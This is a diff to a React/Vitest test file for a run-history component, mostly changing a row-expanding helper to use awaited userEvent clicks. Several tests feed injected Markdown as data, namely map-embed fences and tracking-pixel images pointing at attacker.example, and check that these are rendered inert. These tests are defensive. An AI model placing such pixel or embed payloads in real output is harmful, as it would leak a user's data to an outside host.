@@ -1,4 +1,4 @@
-import { screen, fireEvent, waitFor, within, act } from '@testing-library/react';
+import { screen, waitFor, within, act } from '@testing-library/react';
 import userEvent from '@testing-library/user-event';
 import React from 'react';
 import { describe, it, expect, beforeEach, vi } from 'vitest';
@@ -61,8 +61,9 @@ async function renderHistory(runs = [], total = null, props = {}) {
 }
 
 /** Open a collapsed row. The disclosure is the row's only collapsed button. */
-function expand(row) {
-    fireEvent.click(within(row).getByRole('button', { expanded: false }));
+async function expand(row) {
+    const user = userEvent.setup();
+    await user.click(within(row).getByRole('button', { expanded: false }));
 }
 
 /** The body a row reveals when opened — everything after the summary button. */
@@ -227,7 +228,7 @@ describe('CoworkRunHistory — what one row says while it is closed', () => {
         await renderHistory([run({ triggerKind: 'manual' })]);
         const row = screen.getByTestId('cowork-run');
         expect(within(row).getByRole('button').textContent).not.toMatch(/started/i);
-        expand(row);
+        await expand(row);
         expect(body(row)).toHaveTextContent('Started by you');
     });
 
@@ -239,7 +240,7 @@ describe('CoworkRunHistory — what one row says while it is closed', () => {
             run({ id: 'd', triggerKind: 'MANUAL' }),
         ]);
         const rows = screen.getAllByTestId('cowork-run');
-        for (const row of rows) expand(row);
+        for (const row of rows) await expand(row);
         // An API-triggered run and an upper-cased "MANUAL" both claim the
         // scheduler started them. Nobody did.
         for (const row of rows) expect(body(row)).toHaveTextContent('Started on schedule');
@@ -318,7 +319,7 @@ describe('CoworkRunHistory — opening a row', () => {
             run({ id: 'b', result: 'Second\n\nSecond body' }),
         ]);
         const rows = screen.getAllByTestId('cowork-run');
-        expand(rows[0]);
+        await expand(rows[0]);
         expect(rows[0]).toHaveTextContent('First body');
         expect(rows[1]).not.toHaveTextContent('Second body');
     });
@@ -326,7 +327,7 @@ describe('CoworkRunHistory — opening a row', () => {
     it('renders a result as Markdown', async () => {
         await renderHistory([run({ result: '## Today\n\n- **Drink water**\n- Pick one thing' })]);
         const row = screen.getByTestId('cowork-run');
-        expand(row);
+        await expand(row);
         expect(within(row).getByRole('heading', { name: 'Today' })).toBeInTheDocument();
         expect(within(row).getByText('Drink water').tagName).toBe('STRONG');
         expect(row.textContent).not.toContain('**');
@@ -335,7 +336,7 @@ describe('CoworkRunHistory — opening a row', () => {
     it('leaves a failure as monospaced plain text — asterisks and all', async () => {
         await renderHistory([run({ status: 'failed', result: null, error: 'Rate limited (429): retry in 60s *now*' })]);
         const row = screen.getByTestId('cowork-run');
-        expand(row);
+        await expand(row);
         const pre = body(row).querySelector('.font-mono');
         expect(pre).not.toBeNull();
         expect(pre).toHaveTextContent('Rate limited (429): retry in 60s *now*');
@@ -347,7 +348,7 @@ describe('CoworkRunHistory — opening a row', () => {
         // to deliver it — hides the work it did do.
         await renderHistory([run({ status: 'failed', result: '# The digest it did produce', error: 'Delivery failed' })]);
         const row = screen.getByTestId('cowork-run');
-        expand(row);
+        await expand(row);
         expect(row).toHaveTextContent('Delivery failed');
         expect(row).not.toHaveTextContent('The digest it did produce');
     });
@@ -397,7 +398,7 @@ describe('CoworkRunHistory — what a run result is allowed to render', () => {
         ].join('\n');
         await renderHistory([run({ result: injected })]);
         const row = screen.getByTestId('cowork-run');
-        expand(row);
+        await expand(row);
 
         expect(row.querySelector('iframe')).toBeNull();
         expect(liveUrls(row).join(' ')).not.toContain('attacker.example');
@@ -409,7 +410,7 @@ describe('CoworkRunHistory — what a run result is allowed to render', () => {
         const injected = ['```map-embed', '{"embedUrl":"https://attacker.example/x"}', '```'].join('\n');
         await renderHistory([run({ result: injected })]);
         const row = screen.getByTestId('cowork-run');
-        expand(row);
+        await expand(row);
 
         expect(row.textContent).toContain('embedUrl');
         expect(row.querySelector('iframe')).toBeNull();
@@ -423,7 +424,7 @@ describe('CoworkRunHistory — what a run result is allowed to render', () => {
                 run({ result: ['```' + language, '{"embedUrl":"https://attacker.example/x"}', '```'].join('\n') }),
             ]);
             const row = screen.getByTestId('cowork-run');
-            expand(row);
+            await expand(row);
             expect(row.querySelector('iframe'), language).toBeNull();
             expect(liveUrls(row).join(' '), language).not.toContain('attacker.example');
             unmount();
@@ -441,7 +442,7 @@ describe('CoworkRunHistory — what a run result is allowed to render', () => {
         ].join('\n');
         await renderHistory([run({ result: injected })]);
         const row = screen.getByTestId('cowork-run');
-        expand(row);
+        await expand(row);
 
         expect(row.querySelector('iframe')).toBeNull();
         expect(liveUrls(row).join(' ')).not.toContain('attacker.example');
@@ -454,7 +455,7 @@ describe('CoworkRunHistory — what a run result is allowed to render', () => {
         // and referrer. No click, no fence, no warning.
         await renderHistory([run({ result: 'Report\n\n![](https://attacker.example/pixel.gif?who=owner)\n' })]);
         const row = screen.getByTestId('cowork-run');
-        expand(row);
+        await expand(row);
 
         expect(row.querySelector('img')).toBeNull();
         expect(liveUrls(row).join(' ')).not.toContain('attacker.example');
@@ -467,7 +468,7 @@ describe('CoworkRunHistory — what a run result is allowed to render', () => {
             result: '![Quarterly chart](https://attacker.example/pixel.gif?who=owner)',
         })]);
         const row = screen.getByTestId('cowork-run');
-        expand(row);
+        await expand(row);
 
         const note = within(row).getByTestId('cowork-inert-image');
         expect(note.textContent).toContain('Quarterly chart');
@@ -481,7 +482,7 @@ describe('CoworkRunHistory — what a run result is allowed to render', () => {
         const output = ['## Digest', '', 'Ran `build`:', '', '```js', 'const total = 41 + 1;', '```'].join('\n');
         await renderHistory([run({ result: output })]);
         const row = screen.getByTestId('cowork-run');
-        expand(row);
+        await expand(row);
 
         expect(within(row).getByRole('heading', { name: 'Digest' })).toBeInTheDocument();
         expect(row.textContent).toContain('const total = 41 + 1;');
